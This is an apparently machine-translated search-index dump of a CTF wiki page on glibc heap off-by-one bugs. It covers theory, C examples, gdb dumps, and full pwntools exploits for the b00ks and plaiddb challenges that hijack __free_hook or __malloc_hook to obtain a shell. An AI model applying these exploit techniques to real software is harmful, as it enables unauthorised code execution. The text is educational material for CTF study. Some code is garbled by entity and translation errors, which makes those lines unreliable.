( 'prepare' , 0x68 , 'prepare data' ) one_gadget = libc_base + 0x4526a put ( 'attack' , 0x68 , 'a' * 3 + p64 ( one_gadget )) p . sendline ( 'DEL' ) # malloc(8) triggers one_gadget p . interactive () if __name__ == '__main__' : main ()","title":"Heap-based Off-By-One"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-in-the-heap","text":"","title":"Off-By-One in the heap"},{"location":"pwn/linux/glibc-heap/off_by_one/#introduction","text":"Strictly speaking, the off-by-one vulnerability is a special type of overflow vulnerability. Off-by-one means that when a program writes to a buffer, the number of bytes written exceeds the number of bytes requested by the buffer itself. And only one byte is crossed.","title":"Introduction"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-vulnerability-principle","text":"Off-by-one refers to a single-byte buffer overflow. This vulnerability is often related to the lack of strict boundary verification and string operations. Of course, it does not rule out that the size of the write is just one byte more. Where the boundary verification is not strict, usually includes When writing data to a heap block using a loop statement, the number of loops set incorrectly (which is common in C language beginners) results in more than one byte being written. String operation is not appropriate In general, single-byte overflows are considered to be difficult to exploit, but because of the looseness of Linux's heap management mechanism ptmalloc validation, Linux-based off-by-one exploits are not complex and powerful. In addition, the point to note is that off-by-one can be based on various buffers, such as stacks, bss segments, etc., but the heap-based off-by-one is more common in CTFs. We will only discuss the off-by-one situation on the heap here.","title":"off-by-one Vulnerability Principle"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-use-ideas","text":"The overflow byte is any byte that can be controlled: by modifying the size, there is overlap between the block structures, thereby leaking other block data or overwriting other block data. You can also use the NULL byte overflow method. The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the prev_in_use bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the prev_size field is enabled, you can forge prev_size , causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by prev_size (theoretically the block currently unlinked) is equal to the block size currently being unlinked. In the latest version of the code, the check for the latter method in 2 has been added, but the check was not available before 2.28. /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* The last two lines of code are added in the latest version, then the second method of 2 is not available, but there is no problem in 2.28 and before*/ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); }","title":"off-by-one Use ideas"},{"location":"pwn/linux/glibc-heap/off_by_one/#example-1","text":"int my_gets(char *ptr,int size) { int i; for(i=0;i<=size;i++) { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } Our own my_gets function caused an off-by-one vulnerability because the boundaries of the for loop were not controlled enough to cause writes to be executed once, which is also called a fence error. wikipedia: > Fence errors (sometimes called pole errors or lamppost errors) are a type of error. Such as the following questions: > Build a straight fence (ie no circle), 30 meters long, 3 meters apart between each fence column, how many fence posts do you need? > The easiest answer 10 is wrong. This fence has 10 intervals and 11 fence posts. We use gdb to debug the program. Before inputting, we can see that the two allocated user areas are 16-byte heap blocks. 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 When we execute my_gets for input, we can see that the data has overflowed to cover the prev_size field of the next heap. print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000","title":"Example 1"},{"location":"pwn/linux/glibc-heap/off_by_one/#example-2","text":"The second common scenario that causes off-by-one is string manipulation. The common reason is that the end of the string is incorrectly calculated. int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } At first glance, the program doesn't seem to have any problems (regardless of stack overflow), and many people may write it in the actual code as well. However, the behavior of strlen and strcpy is inconsistent, which leads to the occurrence of off-by-one. Strlen is a function we are familiar with calculating the length of an ascii string. This function does not count the terminator &#39;\\x00&#39; when calculating the length of a string, but strcpy copies the terminator when copying a string. '\\x00'`. This caused us to write 25 bytes to chunk1, which we can see with gdb debugging. 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk Execute strcpy after we type 'A'*24 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400 You can see that the low byte of the size field of the next chunk is overwritten by the terminator &#39;\\x00&#39; . This branch of the off-by-one is called NULL byte off-by-one, which we will see later. The difference between off-by-one and NULL byte off-by-one. There is still one thing why the low byte is overwritten, because the byte order of the CPU we usually use is small endian, such as a DWORD value stored in the memory using the little endian method. DWORD 0x41424344 Memory 0x44, 0x43, 0x42, 0x41","title":"Example 2"},{"location":"pwn/linux/glibc-heap/off_by_one/#1-asis-ctf-2016-b00ks","text":"","title":"\u5b9e\u4f8b 1: Asis CTF 2016 b00ks"},{"location":"pwn/linux/glibc-heap/off_by_one/#title-introduction","text":"The topic is a common menu-style program that features a library management system. 1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit The program provides the ability to create, delete, edit, and print books. The title is a 64-bit program and the protection is as follows. Canary : No NX : Yes PIE : Yes Fortify : No RelRO : Full Each time a program creates a program, it allocates a 0x20 byte structure to maintain its information. struct book { int id; char *name; char *description; int size; }","title":"Title introduction"},{"location":"pwn/linux/glibc-heap/off_by_one/#create","text":"Name and description exist in the book structure, and name and description are allocated on the heap. First allocate the name buffer, use malloc, the size is custom but less than 32. printf(\"\\nEnter book name size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); printf(\"Enter book name (Max 32 chars): \", &size); ptr = malloc(size); The description is then assigned, the same size is customizable but unlimited. printf(\"\\nEnter book description size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); v5 = malloc(size); After allocating the memory of the book structure book = malloc(0x20uLL); if ( book ) { *((_DWORD *)book + 6) = size; *((_QWORD *)off_202010 + v2) = book; *((_QWORD *)book + 2) = description; *((_QWORD *)book + 1) = name; *(_DWORD *)book = ++unk_202024; return 0LL; }","title":"create"},{"location":"pwn/linux/glibc-heap/off_by_one/#vulnerability","text":"There is a null byte off-by-one vulnerability in the read function of the program. If you look closely at the read function, you can find that the consideration of the boundary is not appropriate. signed __int64 __fastcall my_read(_BYTE *ptr, int number) { int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( number <= 0 ) return 0LL; buf = ptr; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\\n' ) break; ++ buf; if ( i == number ) break; } * buf = 0; return 0LL; }","title":"Vulnerability"},{"location":"pwn/linux/glibc-heap/off_by_one/#use","text":"","title":"Use"},{"location":"pwn/linux/glibc-heap/off_by_one/#leak","text":"Because the my_read function in the program has a null byte off-by-one , in fact the terminator '\\x00' read by my_read is written to 0x555555756060. This will overwrite the terminator '\\x00' when 0x555555756060~0x555555756068 is written to the book pointer, so there is a vulnerability in the address leak. The value of the first item in the pointer array can be obtained by printing the author name. 0x555555756040: 0x6161616161616161 0x6161616161616161 0x555555756050: 0x6161616161616161 0x6161616161616161 <== author name 0x555555756060: 0x0000555555757480 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 In order to achieve the leak, first enter 32 bytes in the author name to make the terminator overwritten. After that we create book1, the pointer of book1 will overwrite the last NULL byte in author name, so that the pointer is directly connected with author name, so that the output author name can get a heap pointer. io.recvuntil('Enter author name:') # input author name io.sendline (&#39;a&#39; * 32) io.recvuntil (&#39;&gt;&#39;) # create book1 io.sendline ( &#39;1&#39;) io.recvuntil('Enter book name size:') io.sendline (&#39;32 &#39;) io.recvuntil('Enter book name (Max 32 chars):') io.sendline('object1') io.recvuntil('Enter book description size:') io.sendline (&#39;32 &#39;) io.recvuntil('Enter book description:') io.sendline('object1') io.recvuntil (&#39;&gt;&#39;) # print book1 io.sendline ( &#39;4&#39;) io.recvuntil ( &#39;Author:&#39;) io.recvuntil (&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;) # &lt;== leak book1 book1_addr = io.recv (6) book1_addr = book1_addr.ljust (8, &#39;x00&#39;) book1_addr = u64(book1_addr)","title":"Leak"},{"location":"pwn/linux/glibc-heap/off_by_one/#off-by-one-override-pointer-low-byte","text":"The change function is also provided in the program. The change function is used to modify the author name, so the change can be used to write the author name, and the off-by-one is used to override the low byte of the first item of the pointer array. After overwriting the low byte of the book1 pointer, this pointer points to the description of book1. Since the program provides the edit function, the content in the description can be arbitrarily modified. We can pre-define the data in the description to create a book structure. The description and name pointers of this book structure can be directly controlled. def off_by_one(addr): addr += 58 io.recvuntil('>')# create fake book in description io.sendline ( &#39;3&#39;) fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff) io.recvuntil('Enter new book description:') io.sendline(fake_book_data) # <== fake book io.recvuntil('>') # change author name io.sendline ( &#39;5&#39;) io.recvuntil('Enter author name:') io.sendline('a' * 32) # <== off-by-one Here, the book is forged in the description, and the data used is p64(0x1)+p64(addr)+p64(addr)+pack(0xffff). Where addr+58 is to point the pointer to the pointer address of book2, so that we can modify these pointer values arbitrarily.","title":"off-by-one Override pointer low byte"},{"location":"pwn/linux/glibc-heap/off_by_one/#using-the-stack-to-achieve-utilization","text":"Through the previous two parts, we have obtained the ability to read and write at any address. The reader may find that the following operations are obvious, such as writing the get table hijacking process or writing the __malloc_hook hijacking process. But the special thing about this topic is that PIE is turned on and there is no way to leak the libc base address, so we need to think about other methods. The clever thing about this is that when you allocate a second book, use a large size to make the heap expand in mmap mode. We know that there are two ways to expand the heap. One is that brk will directly expand the original heap, and the other is that mmap will map a piece of memory separately. Here we apply for an oversized block to extend memory using mmap. Because the memory allocated by mmap has a fixed offset from libc, the base address of libc can be derived. Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123 0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- 0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap 0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- 0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack] 0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar] 0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123 0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- 0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap 0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- 0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack] 0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar] 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]","title":"Using the stack to achieve utilization"},{"location":"pwn/linux/glibc-heap/off_by_one/#exploit","text":"from pwn import * context . log_level = \"info\" binary = ELF ( \"b00ks\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) io = process ( & quot ; ./ b00ks & quot ;) def createbook ( name_size , name , des_size , des ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 1 & quot ;) io . readuntil ( & quot ;: & quot ;) io . sendline ( str ( name_size )) io . readuntil ( & quot ;: & quot ;) io . sendline ( name ) io . readuntil ( & quot ;: & quot ;) io . sendline ( str ( des_size )) io . readuntil ( & quot ;: & quot ;) io . sendline ( des ) def printbook ( id ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 4 & quot ;) io . readuntil ( & quot ;: & quot ;) for i in range ( id ): book_id = int ( io . readline ()[: - 1 ]) io . readuntil ( & quot ;: & quot ;) book_name = io . readline ()[: - 1 ] io . readuntil ( & quot ;: & quot ;) book_des = io . readline () [: - 1 ] io . readuntil ( & quot ;: & quot ;) book_author = io . readline ()[: - 1 ] return book_id , book_name , book_des , book_author def createname ( name ): io . readuntil ( & quot ; name : & quot ;) io . sendline ( name ) def changename ( name ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 5 & quot ;) io . readuntil ( & quot ;: & quot ;) io . sendline ( name ) def editbook ( book_id , new_des ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 3 & quot ;) io . readuntil ( & quot ;: & quot ;) io . writeline ( str ( book_id )) io . readuntil ( & quot ;: & quot ;) io . sendline ( new_des ) def deletebook ( book_id ): io . readuntil ( & quot ; & gt ; & quot ;) io . sendline ( & quot ; 2 & quot ;) io . readuntil ( & quot ;: & quot ;) io . sendline ( str ( book_id )) createname ( \"A\" * 32 ) createbook ( 128 , \"a\" , 32 , \"a\" ) createbook ( 0x21000 , \"a\" , 0x21000 , \"b\" ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book1_addr = u64 ( book_author [ 32 : 32 + 6 ] . ljust ( 8 , ' \\x00 ' )) log . success ( \"book1_address:\" + hex ( book1_addr )) payload = p64 ( 1 ) + p64 ( book1_addr + 0x38 ) + p64 ( book1_addr + 0x40 ) + p64 ( 0xffff ) editbook ( book_id_1 , payload ) changename ( \"A\" * 32 ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book2_name_addr = u64 ( book_name . ljust ( 8 , \" \\x00 \" )) book2_des_addr = u64 ( book_des . ljust ( 8 , & quot ; x00 & quot ;)) log . success ( \"book2 name addr:\" + hex ( book2_name_addr )) log . success ( \"book2 des addr:\" + hex ( book2_des_addr )) libc_base = book2_des_addr - 0x5b9010 log . success ( \"libc base:\" + hex ( libc_base )) free_hook = libc_base + libc . symbols [ \"__free_hook\" ] one_gadget = libc_base + 0x4f322 # 0x4f2c5 0x10a38c 0x4f322 log . success ( \"free_hook:\" + hex ( free_hook )) log . success ( \"one_gadget:\" + hex ( one_gadget )) editbook ( 1 , p64 ( free_hook ) * 2 ) editbook ( 2 , p64 ( one_gadget )) deletebook ( 2 ) io . interactive ()","title":"exploit"},{"location":"pwn/linux/glibc-heap/off_by_one/#simple-plan","text":"After any read and write, another way to find libc is to first cause the libc address to be written on the heap before any read and write, and then read it out by any read. In order to find the offset where libc is located, you can debug directly through gdb to view the location of the specific libc address on the heap, without deliberate calculation. Exp is as follows: #! /usr/bin/env python2 # -*- coding: utf-8 -*- # vim: hay = utf-8 import sys import import os.path from pwn import * context(os='linux', arch='amd64', log_level='debug') if len(sys.argv) > 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT) else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH) def cmd(choice): p.recvuntil('> ') p.sendline(str(choice)) def create(book_size, book_name, desc_size, desc): cmd(1) p.recvuntil(': ') p.sendline(str(book_size)) p.recvuntil(': ') if len(book_name) == book_size: p.send(book_name) else: p.sendline(book_name) p.recvuntil(': ') p.sendline(str(desc_size)) p.recvuntil(': ') if len(desc) == desc_size: p.send(desc) else: p.sendline(desc) def remove(idx): cmd(2) p.recvuntil(': ') p.sendline(str(idx)) def edit(idx, desc): cmd(3) p.recvuntil(': ') p.sendline(str(idx)) p.recvuntil(': ') p.send(desc) def author_name(author): cmd(5) p.recvuntil(': ') p.send(author) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def main(): # Your exploit script goes here # leak heap address p.recvuntil('name: ') p.sendline('x' * (0x20 - 5) + 'leak:') create(0x20, 'tmp a', 0x20, 'b') # 1 cmd(4) p.recvuntil('Author: ') p.recvuntil('leak:') heap_leak = u64(p.recvline().strip().ljust(8, '\\x00')) p.info('heap leak @ 0x%x' % heap_leak) heap_base = heap_leak - 0x1080 create(0x20, 'buf 1', 0x20, 'desc buf') # 2 create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3 remove(2) remove(3) ptr = heap_base + 0x1180 payload = p64 (0) + p64 (0x101) + p64 (ptr - 0x18) + p64 (ptr - 0x10) + &#39;\\ x00&#39; create(0x20, 'name', 0x108, 'overflow') # 4 create(0x20, 'name', 0x100 - 0x10, 'target') # 5 create(0x20, '/bin/sh\\x00', 0x200, 'to arbitrary read write') # 6 edit(4, payload) # overflow remove(5) # unlink edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\\n') def write_to(addr, content, size): edit(4, p64(addr) + p64(size + 0x100) + '\\n') edit(6, content + '\\n') def read_at(addr): edit(4, p64(addr) + '\\n') cmd(4) p.recvuntil('Description: ') p.recvuntil('Description: ') p.recvuntil('Description: ') content = p.recvline()[:-1] p.info(content) return content libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\\x00')) - 0x3c4b78 p.info('libc leak @ 0x%x' % libc_leak) write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10) remove(6) p.interactive() if __name__ == '__main__': main()","title":"Simple plan"},{"location":"pwn/linux/glibc-heap/off_by_one/#instance-2-plaidctf-2015-plaiddb","text":"\u279c 2015_plaidctf_datastore git: ( master ) file datastore datastore: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 1a031710225e93b0b5985477c73653846c352add, stripped \u279c 2015_plaidctf_datastore git: ( master ) checksec datastore [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled \u279c 2015_plaidctf_datastore git: ( master ) As you can see, the program is 64-bit dynamically linked. The protection is all turned on.","title":"Instance 2 : plaidctf 2015 plaiddb"},{"location":"pwn/linux/glibc-heap/off_by_one/#functional-analysis","text":"Key data structure: struct Node { char * key; long data_size; char *data; struct Node *left; struct Node *right; long dummy; long dummy1; } The structure of the binary tree is mainly used to store data, and the specific storage process does not affect the utilization. The function function needs to pay attention to getline (self-implemented single-line read function): char *__fastcall getline(__int64 a1, __int64 a2) { char *v2; // r12 char * v3; // rbx size_t v4; // r14 char v5; // al char v6; // bp signed __int64 v7; // r13 char *v8; // rax V2 = (char *)malloc(8uLL); // Initially use malloc(8) for allocation v3 = v2; V4 = malloc_usable_size(v2); // Calculated the available size, for example, for malloc(8), this should be 24 while ( 1 ) { v5 = _IO_getc(stdin); v6 = v5; if ( v5 == -1 ) bye(); if ( v5 == 10 ) break; v7 = v3 - v2; if ( v4 <= v3 - v2 ) { V8 = (char *)realloc(v2, 2 * v4); // The size is not enough to multiply the available size by two for realloc v2 = v8; if ( !v8 ) { puts(\"FATAL: Out of memory\"); exit(-1); } v3 = &amp; v8 [v7]; v4 = malloc_usable_size(v8); } *v3++ = v6; // &lt;--- The vulnerability is where v3 is indexed and points to the next location. If the location is all used, it will point to the next non-writeable location. } *v3 = 0; // &lt;--- The vulnerability is located. Off by one (NULL byte overflow) return v2; } Several main features: unsigned __int64 main_fn() { char v1[8]; // [rsp+0h] [rbp-18h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); puts(\"PROMPT: Enter command:\"); gets_checked(v1, 8LL); if ( !strcmp(v1, \"GET\\n\") ) { cmd_get(); } else if ( !strcmp(v1, \"PUT\\n\") ) { cmd_put(); } else if ( !strcmp(v1, \"DUMP\\n\") ) { cmd_dump(); } else if ( !strcmp(v1, \"DEL\\n\") ) { cmd_del(); } else { if ( !strcmp(v1, \"EXIT\\n\") ) bye(); __printf_chk(1LL, \"ERROR: '%s' is not a valid command.\\n\", v1); } return __readfsqword(0x28u) ^ v2; } Both dump and get are used to read the content, so key and specific data content can be read, and less attention is needed. Focus on put and del : __int64 __fastcall cmd_put() { __int64 v0; // rsi Node *row; // rbx unsigned __int64 sz; // rax char * v3; // rax __int64 v4; // rbp __int64 result; // rax __int64 v6; // [rsp+0h] [rbp-38h] unsigned __int64 v7; // [rsp+18h] [rbp-20h] v7 = __readfsqword(0x28u); row = (Node *)malloc(0x38uLL); if ( !row ) { puts(\"FATAL: Can't allocate a row\"); exit(-1); } puts(\"PROMPT: Enter row key:\"); row->key = getline((__int64)\"PROMPT: Enter row key:\", v0); puts(\"PROMPT: Enter data size:\"); gets_checked((char *)&v6, 16LL); sz = strtoul((const char *)&v6, 0LL, 0); row->data_size = sz; v3 = (char *)malloc(sz); row->data = v3; if ( v3 ) { puts(\"PROMPT: Enter data:\"); fread_checked(row->data, row->data_size); v4 = insert_node(row); if ( v4 ) { free(row->key); free(*(void **)(v4 + 16)); *(_QWORD *)(v4 + 8) = row->data_size; *(_QWORD *)(v4 + 16) = row->data; free(row); puts(\"INFO: Update successful.\"); } else { puts(\"INFO: Insert successful.\"); } result = __readfsqword(0x28u) ^ v7; } else { puts(\"ERROR: Can't store that much data.\"); free(row->key); free(row); } return result; } The distribution process is: Malloc (0x38) (structure) 2. getline (malloc \u548c realloc) malloc (size) controllable size Read the size byte content The more complicated part we can see later will be used, that is, the part about free used in put For deletion, this function is more complicated and will not be explained in detail. In fact, you only need to know that he is deleted according to the key, and the key is read using getline . If there is no such key, the part of getline will not be deleted. If any, then free","title":"Functional Analysis"},{"location":"pwn/linux/glibc-heap/off_by_one/#exploit-analysis","text":"The location of the vulnerability has been pointed out in the functional analysis, in getline , but the special feature of this function is that its allocated size is gradually increasing, by increasing the available size by two, using realloc , that is, if we want to trigger this vulnerability, we need to meet certain size requirements. According to the allocation process, the size of the satisfaction is: 0x18 0x38 0x78 0xf8 0x1f8 ... These sizes can trigger an overflow. Now we need to know the specific methods we need to adopt. First, the off-by-one vulnerability can cause heap crossover, which can cause the libc address to leak. Afterwards, the utilization method to be used, because there is already a heap crossover, that is, a UAF can be formed, and the UAF common method can be used. The easiest way to get a UAF vulnerability is of course fastbin attack, so I used fastbin attack. Here, we can begin to think about how to form the conditions of use we need. The final effect of off-by-one is that you can release a smallbin chunk or unsortedbin chunk of a released state until it is merged into a large chunk by the overflow chunk. That is: +------------+ | | &lt;-- free unsortedbin or smallbin chunk (because fd and bk point to legal pointers at this time, unlink can be done) +------------+ | ... | &lt;-- arbitrary chunk +------------+ | | &lt;-- Chunk for overflow +------------+ | vuln | &lt;-- The chunk that was overflowed, the size is 0x_00 (eg 0x100, 0x200...) +------------+ After the use of off-by-one , the chunks that appear above will be merged into a freed chunk. If the position of any intermediate chunk is already allocated, it can cause overlap. According to our utilization ideas, combined with the topic getline function through malloc(8) and then realloc , we need to: At least one chunk of any chunk location has been allocated, and the chunk of data can be read to leak the libc address. The chunk that overflows needs to be allocated before the top chunk, otherwise malloc(8) will be allocated to the top instead of where the chunk should be. Any chunk location needs at least one chunk that has been released and has a size of 0x71 for fastbin attack All chunks should not be merged into top, so there should be an already allocated chunk at the bottom to guarantee the distance from the top chunk. The size of the chunk that overflows should belong to unsortedbin or smallbin. It cannot be fastbin. Otherwise, after being released, according to the allocation method of getline , malloc(8) cannot be allocated at this location. According to the above principles, we can think about the distribution of chunks as follows: +------------+ | 1 | <-- free \u7684 size == 0x200 chunk +------------+ | 2 | &lt;-- size == 0x60 fastbin chunk, has been allocated, and can read data +------------+ | 5 | &lt;-- size == 0x71 fastbin chunk, ready for fastbin attack +------------+ | 3 | <-- size == 0x1f8 free \u72b6\u6001\u7684 smallbin/unsortedbin chunk +------------+ | 4 | &lt;-- size == 0x101 is overflowed chunk +------------+ | X | &lt;-- arbitrarily allocated chunks prevent top merge +------------+ Since the allocation process has some additional structure (the allocation of the structure itself and getline ), we need to release enough fastbin chunks to avoid the allocation of the structure itself affecting our process. After that, release 5, 3, 1, and then use delline when del is input, fill 3, causing off-by-one , then merge 4 free to merge (forgery prev_size ), so there is a cross heap structure. The process is much simpler. First allocate the size of 1 so that the libc address is written to 2, you can leak the address, then allocate 5 and write the required content, you can fastbin attack.","title":"Exploit Analysis"},{"location":"pwn/linux/glibc-heap/off_by_one/#exploit_1","text":"Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10. #! /usr/bin/env python2 # -*- coding: utf-8 -*- # vim:fenc=utf-8 import sys import os import os.path from pwn import * context ( os = 'linux' , arch = 'amd64' , log_level = 'debug' ) if len ( sys . argv ) > 2 : DEBUG = 0 HOST = sys . argv [ 1 ] PORT = int ( sys . argv [ 2 ]) p = remote ( HOST , PORT ) else : DEBUG = 1 if len ( sys . argv ) == 2 : PATH = sys . argv [ 1 ] p = process ( PATH ) libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) # ubuntu 16.04 def cmd ( command_num ): p . recvuntil ( 'command:' ) p . sendline ( str ( command_num )) def put ( key , size , data ): cmd ( 'PUT' ) p . recvuntil ( 'key:' ) p . sendline ( key ) p . recvuntil ( 'size:' ) p . sendline ( str ( size )) p . recvuntil ( 'data:' ) if len ( data ) < size : p . send ( data . ljust ( size , ' \\x00 ' )) else : p . send ( data ) def delete ( key ): cmd ( 'DEL' ) p . recvuntil ( 'key:' ) p . sendline ( key ) def get ( key ): cmd ( 'GET' ) p . recvuntil ( 'key:' ) p . sendline ( key ) p . recvuntil ( '[' ) num = int ( p . recvuntil ( ' bytes' ) . strip ( ' bytes' )) p . recvuntil ( ': \\n ' ) return p . recv ( num ) def main (): # avoid complicity of structure malloc for i in range ( 10 ): put ( str ( i ), 0x38 , str ( i )) for i in range ( 10 ): delete ( str ( i )) # allocate what we want in order put ( '1' , 0x200 , '1' ) put ( '2' , 0x50 , '2' ) put ( '5' , 0x68 , '6' ) put ( '3' , 0x1f8 , '3' ) put ( '4' , 0xf0 , '4' ) put ( 'defense' , 0x400 , 'defense-data' ) # free those need to be freed delete ( '5' ) delete ( '3' ) delete ( '1' ) delete ( 'a' * 0x1f0 + p64 ( 0x4e0 )) delete ( '4' ) put ( '0x200' , 0x200 , 'fillup' ) put ( '0x200 fillup' , 0x200 , 'fillup again' ) libc_leak = u64 ( get ( '2' )[: 6 ] . ljust ( 8 , ' \\x00 ' )) p . info ( 'libc leak: 0x %x ' % libc_leak ) libc_base = libc_leak - 0x3c4b78 p . info ( 'libc_base: 0x %x ' % libc_base ) put ( 'fastatk' , 0x100 , 'a' * 0x58 + p64 ( 0x71 ) + p64 ( libc_base + libc . symbols [ '__malloc_hook' ] - 0x10 + 5 - 8 )) put ( 'prepare' , 0x68 , 'prepare data' ) one_gadget = libc_base + 0x4526a put ( 'attack' , 0x68 , 'a' * 3 + p64 ( one_gadget )) p . sendline ( 'DEL' ) # malloc(8) triggers one_gadget p . interactive () if __name__ == '__main__' : main ()","title":"exploit"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/","text":"\u5806 in the heap \u00b6 _int_malloc \u00b6 Initial inspection \u00b6 Check Objectives Check Conditions Information | \u7533\u8bf7\u7684\u5927\u5c0f | 